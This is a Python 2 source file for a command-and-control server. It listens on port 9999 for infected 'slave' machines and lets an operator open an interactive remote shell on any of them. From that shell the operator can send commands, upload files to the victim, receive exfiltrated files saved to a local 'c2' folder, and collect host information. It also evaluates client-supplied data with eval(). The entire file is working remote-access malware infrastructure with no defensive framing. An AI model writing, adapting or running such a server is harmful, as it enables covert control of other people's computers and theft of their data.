import socket
import sys
import threading
import signal
import struct
import textwrap
import texttable

u_string = lambda x, y: struct.unpack("<%ds" % y, x)
p_string = lambda x, y, z: struct.pack("<II%ds" % y, y, z, x)
wordwrap = lambda d: '\n'.join(textwrap.wrap(d, 100))

# protocol is length of data in 4 byte unsigned int followed by an integer specifying
# the data type (text(0) or file(1)) followed by the data


def pretty_print(string):
    attr = []
    if string.startswith('[+]'):
        # green
        attr.append('32')
    elif string.startswith('[-]'):
        # red
        attr.append('31')
    else:
        attr.append('33')
    print '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)


def format_and_send(sock, data, data_type):
    sock.sendall(p_string(data, len(data), data_type))


def receive_and_format(sock):
    len_data = int(struct.unpack("<I", sock.recv(4))[0])
    type_data = int(struct.unpack("<I", sock.recv(4))[0])
    data = sock.recv(len_data)
    final_data = data

    while len(final_data) < len_data:
        size_to_recv = len_data - len(final_data)
        data = sock.recv(size_to_recv)
        final_data += data

    final_data = u_string(final_data, len_data)[0]

    if type_data == 0:
        return final_data

    elif type_data == 1:
        with open('/Users/BATMAN/Desktop/c2/file', 'wb') as f:
            f.write(final_data)
            return "[+] File saved to Desktop/c2"

    elif type_data == 2:
        try:
            final_data = eval(final_data)
            # print final_data
            t = texttable.Texttable()
            for row in final_data:
                row_to_add = []
                for item in row:
                    if not item:
                        item = ''
                    try:
                        item = item.encode('utf-8')
                    except:
                        item = str(item)
                    row_to_add.append(wordwrap(item))
                t.add_row(row_to_add)
            return t.draw()
        except Exception as e:
            print e


class Server:

    def __init__(self):
        self.slaves = None
        self.server = '0.0.0.0'
        self.port = 9999
        self.threads = []
        self.server_socket = None
        self._register_signals()

    def create_server(self):
        try:
            pretty_print("[+] Creating socket")
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.server, self.port))
            self.server_socket.listen(5)

        except socket.error, (value, message):
            if self.server_socket:
                self.server_socket.close()

            pretty_print("[-] Could not open socket: %s" % str(message))
            sys.exit(1)

    def run(self):
        self.create_server()

        while True:
            try:
                pretty_print("[+] Waiting for connections")
                pretty_print("[+] Press Ctrl-C for interacting with active connections")
                handler = Handler(self.server_socket.accept())
                handler.start()
                self.threads.append(handler)

            except:
                # pretty_print("[-] Debug")
                pass


    def _register_signals(self):
        signal.signal(signal.SIGINT, self._interact)
        # signal.signal(signal.SIGHUP, self._cleanup)

    def _interact(self, signum, frame):
        if not len(self.threads):
            pretty_print("[-] No connected clients")
            return
        pretty_print("[+] Choose which client to interact with")
        for i, handler in enumerate(self.threads):
            pretty_print("%d. %s" % (i, str(handler.address[0])))

        slave_id = int(raw_input('> ').strip())
        self._spawn_shell(self.threads[slave_id])

    def _spawn_shell(self, thread):
        sock = thread.slave
        address = thread.address
        pretty_print("[+] Interacting with %s" % str(address))
        while True:
            command = raw_input('> ').strip()
            t = 0
            if command == "!kill":
                # code for closing socket and removing from thread
                pretty_print("[+] Closing socket and removing client")
                format_and_send(sock, command, 0)
                sock.close()
                self.threads.remove(thread)
                thread.join()
                break

            elif command.startswith("!upload"):
                command = command.split(' ')
                if len(command) != 2:
                    pretty_print("[-] Usage: !upload <path>")
                    continue

                try:
                    with open(command[1], 'rb') as f:
                        command = f.read()
                    t = 1
                except:
                    pretty_print("[-] Command execution failed")

            format_and_send(sock, command, t)

            pretty_print("[+] Getting response")
            response = receive_and_format(sock)

            try:
                pretty_print(response)
            except:
                print response

    def _cleanup(self):
        pretty_print("[+] Cleaning up and shutting down")
        self.server_socket.close()
        for handler in self.threads:
            handler.join()


class Handler(threading.Thread):
    def __init__(self, (slave, address)):
        threading.Thread.__init__(self)
        self.slave = slave
        self.address = address

    def run(self):
        pretty_print("[+] Got connection from %s" % str(self.address))
        pretty_print("[+] Slave information: %s\n" % str((receive_and_format(self.slave))))
        pretty_print("[+] Supported commands: %s \n" % str((receive_and_format(self.slave))))
